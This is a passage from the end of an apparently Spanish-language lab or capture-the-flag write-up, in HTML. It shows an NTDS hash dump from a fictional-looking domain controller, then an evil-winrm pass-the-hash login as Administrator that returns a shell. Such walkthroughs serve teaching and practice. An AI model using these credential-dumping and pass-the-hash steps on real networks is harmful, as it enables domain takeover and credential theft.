+</span><span class="az">SMB         </span><span class="p">dc2.megaairline.local 445    DC2              </span><span class="ve">[+] </span><span class="p">Dumping the NTDS, this could take a while so go grab a redbull...
+</span><span class="az">SMB         </span><span class="p">dc2.megaairline.local 445    DC2              </span><span class="am">Administrator:500:aad3b435b51404eeaad3b435b51404ee:674f1a5c73f4faad8ddbf7f3bf86db60:::
+</span><span class="az">SMB         </span><span class="p">dc2.megaairline.local 445    DC2              </span><span class="am">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span><span class="az">SMB         </span><span class="p">dc2.megaairline.local 445    DC2              </span><span class="am">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a3a4a21b530fcfafb9e4ae8a97d001d:::
+</span><span class="az">SMB         </span><span class="p">dc2.megaairline.local 445    DC2              </span><span class="am">megaairline.local\elliot:1108:aad3b435b51404eeaad3b435b51404ee:74fdf381a94e1e446aaedf1757419dcd:::
+</span><span class="az">SMB         </span><span class="p">dc2.megaairline.local 445    DC2              </span><span class="am">megaairline.local\anna:2101:aad3b435b51404eeaad3b435b51404ee:78350c7b3c5fe865d954d5b47013e21f:::
+</span><span class="az">SMB         </span><span class="p">dc2.megaairline.local 445    DC2              </span><span class="am">megaairline.local\thomas:2601:aad3b435b51404eeaad3b435b51404ee:f639889cc1edee80e4469d0cb118be53:::
+</span><span class="az">SMB         </span><span class="p">dc2.megaairline.local 445    DC2              </span><span class="am">megaairline.local\pippa:2602:aad3b435b51404eeaad3b435b51404ee:f5b43ca4ad68bce5349f7cb4b3168e4e:::
+</span><span class="az">SMB         </span><span class="p">dc2.megaairline.local 445    DC2              </span><span class="am">megaairline.local\angela:2603:aad3b435b51404eeaad3b435b51404ee:df36ca14e6d8a3d06b2c895895dbf48a:::
+</span><span class="az">SMB         </span><span class="p">dc2.megaairline.local 445    DC2              </span><span class="am">megaairline.local\nigel:2604:aad3b435b51404eeaad3b435b51404ee:923ef4c82666a2116ac5deda0a6b2e52:::
+</span><span class="az">SMB         </span><span class="p">dc2.megaairline.local 445    DC2              </span><span class="am">megaairline.local\kate:2605:aad3b435b51404eeaad3b435b51404ee:805caf15ba4486fa23aeb1752503add2:::
+</span><span class="az">SMB         </span><span class="p">dc2.megaairline.local 445    DC2              </span><span class="am">megaairline.local\emily:2606:aad3b435b51404eeaad3b435b51404ee:24bfa93d0525c9f374467224de523a6f:::
+</span><span class="az">SMB         </span><span class="p">dc2.megaairline.local 445    DC2              </span><span class="am">DC2$:1000:aad3b435b51404eeaad3b435b51404ee:cdfd67901176f6168d325d9ee3919e82:::
+</span><span class="az">SMB         </span><span class="p">dc2.megaairline.local 445    DC2              </span><span class="am">MS01$:1106:aad3b435b51404eeaad3b435b51404ee:1a60da9a2479af44780749249ed6248f:::
+</span><span class="az">SMB         </span><span class="p">dc2.megaairline.local 445    DC2              </span><span class="am">attackersystem$:9104:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4:::
+</span><span class="az">SMB         </span><span class="p">dc2.megaairline.local 445    DC2              </span><span class="am">WIN-DWYFTZ3RGAP$:9110:aad3b435b51404eeaad3b435b51404ee:dc5ff9610f5f69eae209c81c0fceae52:::
+</span><span class="az">SMB         </span><span class="p">dc2.megaairline.local 445    DC2              </span><span class="am">DAEDALUS$:1107:aad3b435b51404eeaad3b435b51404ee:680a37bc4b11bc76657bc23341beffd6:::</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos simplemente conectarmos como <code class="language-plaintext highlighter-rouge">Administrator</code> a DC2 y obtener una shell</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ evil-winrm</span><span class="p"> -i dc2.megaairline.local -u Administrator -H 674f1a5c73f4faad8ddbf7f3bf86db60  
+PS C:\Users\Administrator\Documents&gt; </span><span class="am">whoami</span><span class="p">
+megaairline\administrator
+PS C:\Users\Administrator\Documents&gt; </span><span class="am">hostname</span><span class="p">
+DC2
+PS C:\Users\Administrator\Documents&gt;</span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">© 2023 - GatoGamer1155</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="/js/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  
+
+
+
+</body></html>
